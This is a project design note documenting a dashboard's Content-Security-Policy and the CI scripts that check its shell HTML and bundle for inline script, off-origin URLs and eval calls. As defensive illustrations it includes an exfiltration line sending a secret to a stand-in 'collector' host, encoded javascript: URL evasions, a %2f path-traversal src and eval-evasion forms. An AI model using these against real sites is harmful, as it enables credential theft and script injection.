---
name: dashboard-shell-csp
description: 'The dashboard shell CSP after #195 — what each directive is for, why style-src carries unsafe-inline and img-src exists at all (both measured, neither a control, do not report either as a weakness), that script-src has no unsafe-* and connect-src is self, what the policy does NOT bound (outbound navigation and WebRTC are outside CSP, so exfiltration is harder not closed — a finding saying so is correct), that every HTML document including /login carries it, what a change here has to re-verify in a browser rather than by reading the header, that an external <a href> is deliberately not a finding in the build-side checker, and that the emitted bundle is guarded separately by scripts/check-dashboard-bundle.ts, which parses for eval/Function call expressions, deliberately does not flag obj.eval, deliberately does not follow an alias or a computed name, and since #227 starts at the shell tag list and walks the emitted static import graph from there, reporting rather than skipping a specifier it cannot follow, so a code-split chunk is read and a finding saying one would go unread is stale, with the declared residue now being Worker/runtime-appended-script/`require` (each measured, each tracked) and `containedIn` bounding the specifier while #233 added `realPathInside`, which realpaths both the file and the build directory before each WALKED file is opened and also refuses a non-regular file, so a finding that a symlink in the build reads outside it, or that an in-build FIFO stalls CI, is now stale — but the shell HTML itself is still read ungated, deliberately, because it is what the boundary is derived from; and the three traps found building it that a finding should not re-report - the Map-not-object-literal lookup, which since #226 is settled in both files rather than open on NAMED_REFS, the %2f containment check, and scriptFiles counting unclosed script tags (issue #200)'
metadata:
  type: project
---

`DASHBOARD_CSP` in `crates/honmoon-mgmt/src/lib.rs`, served by `static_handler` on both the
embedded-asset branch and the SPA fallback (issue #195). Pinned verbatim by
`the_dashboard_shell_carries_a_script_bounding_csp` in `crates/honmoon-mgmt/tests/e2e.rs`.

```
default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self';
connect-src 'self'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'
```

**What it is for.** #188 made the browser credential script-readable (`sessionStorage`), which is
what puts it beyond a sibling loopback port's reach — see `mgmt-api-auth-model`. `script-src 'self'`
and `connect-src 'self'` bound what a script injection in this origin would then cost. There is no
known injection: the bundle is first-party and embedded, the views render API data as text, and the
one `innerHTML`-class sink is `react-simple-code-editor`'s highlight layer fed `Prism.highlight`
output in `PolicyView`. Defence in depth, not a vulnerability fix — a finding that describes it as
closing a live hole has the framing wrong in the other direction.

**`style-src 'unsafe-inline'` is deliberate and forced, not laxity — do not report it as a
weakness.** `react-simple-code-editor` 0.14.1 renders an unconditional
`React.createElement('style', { dangerouslySetInnerHTML: … })` (`lib/index.js:401`). Measured in
Chrome: under `style-src 'self'` that element raises a `style-src-elem` violation and its `sheet`
is `null`; under the shipped policy it applies (2 `cssRules`). `'unsafe-inline'` in one directive
does not reach another, so `script-src` is unaffected. Hashing the element instead was considered
and rejected: it would pin a Rust constant to a transitive npm package's exact CSS text, and a
dependency bump would break it silently.

**`img-src 'self'` is not a control either.** No view loads an image. It is there because Chrome
probes `/favicon.ico` unasked — measured: with the directive the request is made, and with it
removed from the same build the request never leaves.

**What the policy does NOT bound, so the bound is not cited as wider than it is.** `connect-src`
covers `fetch`/XHR/`sendBeacon`/`EventSource`, and `img-src`/`form-action` cover the unscripted
carriers — but **no CSP directive in a shipping browser restricts outbound navigation**, so
`location.href = 'https://collector/' + secret` and `window.open` still leave with the credential
(`navigate-to` was specified and dropped). WebRTC is outside `connect-src` too and `webrtc 'block'`
is deliberately not set — closing it alone changes nothing while navigation is open. Exfiltration is
therefore **harder and quieter, not closed**, and a finding saying so is correct rather than a
re-report of something settled. This note previously said the credential had "nowhere to go"; that
was wrong and was corrected in the same PR.

**Every HTML document carries the policy, not just the shell.** `DOCUMENT_HEADERS` is applied by
`static_handler`'s two arms *and* by `/login`'s `401` refusal page. That last one matters because a
CSP binds the document it is served with, so a policy-free same-origin document is an escape from
this policy rather than a gap beside it — a script could open it and run there unbound. The e2e
test covers `/login?token=wrong` for that reason. Responses deliberately without it: `/healthz` and
the two 404 arms (`text/plain`), `/api/*` (JSON), and `/login`'s `303` (no rendered body).

**The invariant worth defending on any edit here** (it outlives the exact policy string): no
`'unsafe-inline'`, `'unsafe-eval'`, `'unsafe-hashes'` or `*` in `script-src`, and `connect-src`
stays `'self'`. The e2e test asserts both separately from the verbatim pin for that reason.

**Verify a change in a browser, not by reading the header.** A CSP that breaks the dashboard is
worse than none, and the header is served identically either way. What was actually run for #195
(`Skill("run-honmoon")` + `agent-browser`): load the printed login URL, walk all four views,
confirm `/api/audit`, `/api/approvals` and `/api/policy` return 200 and the Policy view renders
Prism tokens, and check `agent-browser console` / `errors` are empty. The enforcement control that
proves the policy is not a no-op: with a `securitypolicyviolation` listener installed, append an
inline `<script>` and fetch a sibling loopback port — observed
`script-src-elem`/`connect-src`/`img-src`/`frame-src` violations and `inlineRan: false`.

**`script-src 'self'` depends on the *build*, which no Rust test can see.** The CI job builds the
dashboard only in the JS job, so `cargo test` runs against the script-less placeholder
`crates/honmoon-mgmt/build.rs` writes — a Rust assertion about inline script there would pass
vacuously. `scripts/check-dashboard-csp.ts` is the guard instead: it runs after `bun run build` and
`bun demo/build.ts` in CI and refuses an inline `<script>`, an off-origin `src`, an off-origin
`href` on a *subresource* element, a `javascript:` URL anywhere, an inline handler (quoted or not), a
`<base>`, a `<form>`, a `<script>` opening tag it could not read to a `</script>` — and a shell with
no `<script>` at all, which is how it refuses to pass on that placeholder. Attribute values need not
be quoted, a quoted `>` does not end a tag, and values are decoded the way the HTML parser decodes
them (`java&#x73;cript:`, `javascript&colon;`, an embedded tab) before the scheme is read — all
three were misses fixed under review, so do not re-report them. Decoding is deliberately one pass:
`&amp;#x73;` is literal text in the DOM, and a second pass would invent a finding on a working link.

**Whether a URL is off-origin or `javascript:` is decided by `new URL`, not by a pattern — and a
finding proposing a pattern for it is going backwards.** Four review rounds found four ways a regex
reads a URL differently from the browser that will fetch it: a hidden scheme (`java&#x73;cript:`), a
hidden authority (`&sol;&sol;host`), a leading space (` https://host`, which a browser strips before
reading the scheme), and a backslash authority (`/\host`, which a browser reads as `//host`). The
parser handles all four and every later one of that shape, so the only normalisation left in this
file is the HTML-level character-reference decode that must happen *before* the parser sees the
value. An unparseable URL is reported, not skipped.

It resolves against **two** stand-in bases and asks whether each result landed on the origin it was
resolved from, rather than comparing to one host: the serving origin is not known at build time (the
gateway uses whatever `--mgmt-addr` it was given, over cleartext `http` at a loopback port; the demo
build comes off Cloudflare Pages over `https`), so there is no host to compare against, and a URL
naming a single stand-in would have read as same-origin. Do not propose comparing against a
configured host — there isn't one. **The two bases differ in scheme as well as host, and that is
load-bearing**: `src="https:cdn.example/app.js"` is a *relative* reference under an `https` base and
an absolute one under `http`, so two `https` stand-ins passed it while a browser on the gateway
fetches `https://cdn.example`. Both reviewers found that independently in one round.

**`NAMED_REFS` is a deliberate subset and its gaps are closed by reporting, not by growing it.** A
name the table does not cover is reported — "cannot decode, refusing to pass" — the same stance as
the unreadable-`<script>` rule, so a finding of the form "the table is missing `&<name>;`" is
answered by that rule rather than by an edit. Two guards keep that from failing a working link, and
both are tested: the scan runs over the *raw* attribute token by token, so `&amp;hellip;` is one
known reference plus literal text rather than an unknown one; and a `;` is required, so `?a=1&b=2`
is a query string. Malformed numeric references (`&#x110000;`, a lone surrogate, `&#0;`) decode to
U+FFFD as the spec says rather than throwing — a `RangeError` in CI is a stack trace where a finding
belongs, and leaves the shell unchecked. The table is a `Map` since #226, which is what makes the
reporting stance hold for every name rather than for all but the few `Object.prototype` carries —
see the first trap below.

**An external `<a href>` is deliberately NOT a finding** and re-reporting it is wrong: CSP governs
what the document fetches, not where a link takes the reader, so failing CI over a working link
would be the checker's own "a CSP that breaks the dashboard is worse than none". Four reviewers
raised it in one round against the version that did flag it; `NAVIGATION_HREF` is the fix, and
`<link href>` stays checked because that one is a fetch. A `javascript:` href is the exception to
the exception — it is code, not navigation.

**That guard reads the shell HTML only, not the emitted bundle.** The code the shell loads is the
other half of the same property — `script-src 'self'` carries no `'unsafe-eval'`, so the policy
refuses `eval` and the `Function` constructor in that code too — and it is guarded by a sibling
script, `scripts/check-dashboard-bundle.ts` (issue #200), running as its own CI step after the same
two builds. It **parses** each file with TypeScript's parser (already a root devDependency; nothing
was added for it) and reports a *call expression*, never a character match: `eval(` occurs inside
string literals, in comments, and as a method name, so a pattern over minified output would fail CI
on an unrelated dependency bump — this checker's own "worse than no CSP". Verified clean on the
build at the time it was added.

It starts from the files `scriptFiles` names from the shell's own `<script src>` tags, deliberately
not a `dist/assets/*.js` glob: a glob would be a second idea of what "the build" is, and would drift
from the shell the first time Vite emitted a chunk the shell does not load, or the demo shim landed
outside `assets/`. Where it goes from there is the import graph — see below.

**Its coverage is narrow on purpose, and a finding that it misses an evasion is answered by that
rather than by an edit.** It reads `eval`/`Function` reached directly, through the parenthesised
comma form a bundler emits for indirect eval (`(0, eval)(…)`), or as a property of `window`,
`globalThis`, `self` or `global`. It does **not** follow an alias (`const f = Function; f(src)`), a
computed name (`globalThis['ev' + 'al']`), or `setTimeout` given a string — all of which the policy
also refuses. What it defends against is a dependency that starts calling `eval` in a first-party
build, not a bundle written to defeat the guard, and claiming the stronger property would be the
more expensive mistake. **`obj.eval(x)` on anything that is not a named global is deliberately not a
finding**: that is a method sharing the name, no directive governs it, and flagging it is exactly
the false positive parsing is here to avoid. A file the parser cannot read fails rather than passing
uninspected, the same stance as the unreadable-`<script>` rule above.

**A name is matched by spelling, not by resolved binding — declared, and a re-report is answered
here.** For `eval` this is free: the chunks are module code, module code is strict, and `eval` is not
a legal binding name in strict mode, so the identifier is the global one by construction (the demo
shim is a classic script where `var eval` is legal, and is forty hand-written lines in this repo).
`Function` is shadowable, so `const Function = factory; Function(src)` is reported and should not be
— accepted, because what is read is minified first-party output where a local binding is a one- or
two-letter name, and an approximate shadow check would trade a false positive nobody has hit for a
missed `eval`. Raised by Greptile on #224 as a P1 and answered there.

**It starts at the shell's `<script src>` tags and walks the emitted import graph from there, so
the gap #227 named is closed and a finding saying a code-split chunk goes unread is now wrong.**
The tags alone are the executed set only while the build emits one chunk, which is still true today
(verified on the build at the time: three `.js` files across both shells, and the walked set equals
them exactly). A lazy route or a `manualChunks` entry emits a chunk the entry imports and the shell
references only as `<link rel="modulepreload">`, and that chunk is now parsed. The graph is walked
rather than globbed for the reason the tag list was chosen over a glob in the first place: one
notion of "the build", derived from the same shells, so the two guards still cannot disagree.

**What keeps that set closed is that an unfollowable specifier is a finding, not a skip.** Followed:
a string literal on an `import`, an `export … from`, or an `import(…)`, naming a relative path that
stays inside the shell's own directory — the containment asserted with the *same* predicate
`scriptFiles` uses (`containedIn` in `check-dashboard-csp.ts`), which is how the filesystem-root
prefix bug below cannot come back on the new path, and — since #233 — the real-path containment
`realPathInside` asserts on whatever that specifier turns out to name on disk. Reported: a specifier that is not a string
literal (`import(route)`), one that is not relative (bare, root-absolute, off-origin), one resolving
outside the build, and one naming a file the build did not emit. Percent-escapes in a specifier are
deliberately not decoded — an undecoded escape can only name a file that does not exist, which is
reported, while decoding one would re-open the `%2f` case measured below.

**It is the *static ESM* graph, and the residue is declared rather than closed.** Not walked and not
reported: a module reached by something that is not an ES module specifier —
`new Worker(new URL('./w.js', import.meta.url))`, a `<script>` element appended at runtime — and a
`require('./x.js')` call in the emitted output. Same ground as the alias and computed-name cases:
this guards a first-party build against a dependency that starts calling `eval`, not a bundle
written to evade it. Nothing in this repository emits any of the three. A finding naming *that*
residue is correct and new; one naming the module graph itself is stale.

**`require` is the residue shape worth knowing about, because it is the one that is *static* —
measured, not inferred.** `importSpecifier` reads only `ImportDeclaration`, `ExportDeclaration` and
an `ImportKeyword` call, so a `require` call is neither followed nor reported: a `dist/assets/` chunk
reached only that way and containing `eval("pwned")` produced `exit=0` and a green
"no `eval`/`Function` construction in the 1 file(s)" pass line. **The module doc names it explicitly
and gives the reason**, so it is declared residue rather than an unstated hole in the
unfollowable-specifier-is-a-finding invariant — which is scoped to ESM specifiers: `require` is not
defined in module code, so such a call is not a live edge, and *reporting* every one would fail CI on
the dead `typeof require !== 'undefined'` branch a dependency ships, while *following* one would
report a bare `require('fs')` in that same branch as naming no file. Either way the guard breaks a
working build. Measured on the current build: the emitted chunk has no `require` call at all — its
three `require` substrings are the React prop `required`. Tracked on its own issue; a finding
proposing to simply report or follow `require` is answered by the two false positives above.

**A symlink in the build used to redirect the read out of it; #233 closed that, and a finding
saying the guards still follow one is stale.** `containedIn` is a lexical prefix test, so it bounds
the *specifier* and not what gets opened — measured before the fix: a symlink at
`dist/assets/link.js` pointing outside the tree, reached by `import './link.js'` from the entry
chunk, was read and listed in the pass line as inspected, and aimed at `/etc/hosts` it printed a
parse diagnostic for it. Content is not echoed by `syntaxErrors` (message + position only), but a
refusal excerpt prints 80 characters, and a symlink to a FIFO or an endless device would have
stalled CI (both are closed now — see the two rules below). The precondition was always write access to the build output — the same access that
could just emit `eval` directly — so the marginal gain to the modelled attacker was ~nil; the reason
to fix it was that the boundary was *described* as bounding reads.

The fix is `realPathInside` in `check-dashboard-csp.ts`: `realpathSync` on **both** sides, the file
and the build directory, then the same `containedIn` on the results — applied in `inspectBundles`
immediately before each **walked** file is opened, which is the one point both routes into the walk
(a `<script src>` and an `import`) converge on, so neither guard was left with the hole. Resolving
only the file is the identical mismatch pointing the other way: `TMPDIR` on macOS sits under `/var`,
a symlink to `/private/var`, so every file in the build would fall outside an unresolved build
directory. That direction does **not** pass vacuously — every outcome is reported — it refuses a
legitimate build and fails CI on it, which is the false-positive failure these scripts are shaped to
avoid; measured, it turned 26 existing bundle tests red on macOS. Pinned by a test that serves the
shell through a symlinked directory.

Two things that wording must not be read as covering, both deliberate and both now pinned:

- **Containment does not bound the file *type*, so a second rule does.** `realpathSync` succeeds on
  a FIFO and a synchronous `readFileSync` on one blocks until a writer appears, with no timeout in
  the script — measured, the walk hung and the CI step would have run to the job limit, and the test
  for it *hangs* rather than fails when the rule is removed. Containment alone covers a symlink to
  `/dev/zero` (it leaves the build) but not a pipe sitting inside it, so a resolved path must also
  be a regular file. A finding proposing to drop that check as redundant with containment is wrong.
- **The shell HTML is read without the gate, on purpose.** `inspectBundles` opens the shell at its
  own `readFileSync`, and `checkShells` does the same; neither is bounded, because the shell is
  named by argv or `DEFAULT_SHELLS` and is the path `buildDir` derives the boundary *from* — there
  is no enclosing directory to bound it against, and whoever can point the script at a shell can
  point it anywhere already. Measured: a symlinked `dist/index.html` is read from outside the tree
  with `problems: []`. That is the declared edge of the boundary, not a hole in it, and a finding
  reporting it as one is answered here.

An unresolvable path is reported, not skipped, and the message says which case it is: a chunk the
build never emitted reports `not found — run …`, a **dangling symlink** reports `is a symlink whose
target does not exist` (a rebuild fixes the first and may leave the second exactly where it is, so
they must not share a remedy), a cycle reports `did not resolve` carrying the errno, and a
non-regular file reports `not a regular file`. `scriptFiles` itself stays path arithmetic and opens
nothing, which is why it still resolves the scripts of a shell that was never built — so a finding
asking for `realpathSync` *there* is asking for the fix to move off the read it bounds.

**Three traps were found building that guard under review, and a finding re-reporting any of them is
answered by this rather than by an edit.** All three are fixed and tested.

- **The refused-name lookup is a `Map`, and that is load-bearing.** As an object literal,
  `REFUSED['toString']` resolved through the prototype chain to `Object.prototype.toString` —
  truthy — so a bundle calling a function named `toString`, `valueOf`, `constructor` or
  `hasOwnProperty` failed CI with `function toString() { [native code] }` printed where the finding
  belongs. **`NAMED_REFS` in `check-dashboard-csp.ts` had the identical shape and took the identical
  fix in #226**, so a finding about *either* lookup is now settled: an `Object.prototype` member
  whose name `CHAR_REF` can spell is reported as undecodable rather than substituting its
  `[native code]` source into the URL. The tests cover every such name rather than a sample —
  `constructor`, `toString`, `toLocaleString`, `valueOf`, `hasOwnProperty`, `isPrototypeOf`,
  `propertyIsEnumerable` — so a finding naming any one of them is answered here. `&__proto__;` is
  the near-miss to leave alone: it passes undecoded, but not through the table and not by a
  truncated match — `CHAR_REF`'s name group is `[a-z][a-z0-9]*`, the character after the `&` is one
  it cannot start on, so no match begins there and neither the table nor `UNKNOWN_REF` is reached,
  which is how a browser reads it too. (An underscore *inside* a name does truncate: `&proto_x;`
  matches `&proto`, unterminated.) A test pins that, and a finding proposing to report it is
  answered here.
- **`new URL` does not percent-decode a path segment, so the containment is checked, not inferred.**
  A literal `../` and `%2e%2e` are both collapsed by the parser, which reads as sufficient — but
  `%2f` survives into the `decodeURIComponent` that follows and becomes a separator again. Measured:
  `src="/assets/..%2f..%2foutside.js"` named a file two levels above `dist/`, same-origin the whole
  way, with both guards green. `scriptFiles` now asserts the joined path stays under the shell's
  directory — and that prefix has to account for `resolve` leaving no trailing separator *except* at
  a filesystem root, where `dir` already is one and `dir + sep` becomes `//`, refusing every script
  a root-served shell loads. Both halves are tested; a finding on either is answered here. Since
  #227 that assertion lives in one exported predicate, `containedIn`, which the import-graph walk
  calls too — so a finding proposing a hand-rolled prefix on either side is going backwards. Since
  #233 there are two named halves and they are not interchangeable: `containedIn` bounds the path
  expression, `realPathInside` bounds the file a read of that path opens.
- **`scriptFiles` counts `<script>` opening tags, for the same reason `checkShell` does.**
  `SCRIPT_TAG` is lazy and skips an opening tag with no `</script>`, so its `src` landed in neither
  the file list nor the unresolved list — and a shell whose remaining tags resolved then handed the
  bundle guard a non-empty file set, which passed its anti-vacuity rule while that script's code was
  never read. The tell was the asymmetry: one side of the mechanism had refused a shell it could not
  fully read since #199 and the other silently narrowed the build to the part it could.
